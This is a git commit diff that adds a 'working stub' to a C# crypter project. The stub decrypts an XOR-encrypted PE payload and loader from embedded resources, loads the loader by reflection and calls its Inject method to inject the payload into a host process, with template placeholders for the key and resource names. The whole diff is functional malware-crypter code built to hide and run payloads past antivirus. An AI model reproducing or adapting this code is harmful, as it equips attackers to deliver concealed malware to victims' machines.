67eb467cd182af80221d9e50911c6ce95c52e4d2
Nathan Richardson <nathan-r@hotmail.com.au>
2018-10-31 02:57:15 +1100

    Added working stub

--- Crypt/Resources/Stub.cs
+++ Crypt/Resources/Stub.cs
@@ -3,26 +3,63 @@ using System.Windows.Forms;
 using System.Resources;
 using System.Reflection;
 
+internal static class Options
+{
+    public static string encryptionKey = "[encryptionKey]";
+    public static string resFileName = "[resFileName]";
+    public static string resPayloadName = "[resPayloadName]";
+    public static string resLoaderName = "[resLoaderName]";
+    public static string hostDir = @"[hostDir]";
+}
+
 static class Program
 {
-    [STAThread]
     static void Main()
     {
-        Application.EnableVisualStyles();
-        Application.SetCompatibleTextRenderingDefault(false);
-        Application.Run(new Form1());
+        System.Resources.ResourceManager resMan = new System.Resources.ResourceManager(Options.resFileName, System.Reflection.Assembly.GetExecutingAssembly());
+
+        Byte[] encKey = Convert.FromBase64String(Options.encryptionKey);
+        byte[] decPE = GetDecryptedPE(resMan, encKey);
+        byte[] decLoader = GetDecryptedLoader(resMan, encKey);
+
+        Inject(decPE, decLoader, Options.hostDir);
+    }
+
+    private static byte[] GetDecryptedPE(System.Resources.ResourceManager resMan, Byte[] encKey)
+    {
+        byte[] encPE = (byte[])resMan.GetObject(Options.resPayloadName);
+        byte[] decPE = Xor(encPE, encKey);
+        return decPE;
+    }
+
+    private static byte[] GetDecryptedLoader(System.Resources.ResourceManager resMan, Byte[] encKey)
+    {
+        byte[] encLoader = (byte[])resMan.GetObject(Options.resLoaderName);
+        byte[] decLoader = Xor(encLoader, encKey);
+        return decLoader;
+    }
+
+    private static void Inject(byte[] decPE, byte[] decLoader, string hostDir)
+    {
+        System.Reflection.Assembly loaderDLL = System.Reflection.Assembly.Load(decLoader);
+
+        Type loaderType = loaderDLL.GetType("Loader");
+        Object loader = Activator.CreateInstance(loaderType);
+
+        System.Reflection.MethodInfo injectMethod = loaderType.GetMethod("Inject");
+        injectMethod.Invoke(loader, new Object[] { decPE, hostDir });
+    }
+
+    private static byte[] Xor(byte[] input, byte[] key)
+    {
+        byte[] output = new byte[input.Length];
+
+        for (int i = 0; i < input.Length; i++)
+        {
+            output[i] = (byte)(input[i] ^ key[i % key.Length]);
+        }
+
+        return output;
     }
 }
 
-public partial class Form1 : Form
-{
-    public Form1()
-    {
-        InitializeComponent();
-    }
-
-    private void InitializeComponent()
-    {
-        
-    }
-}
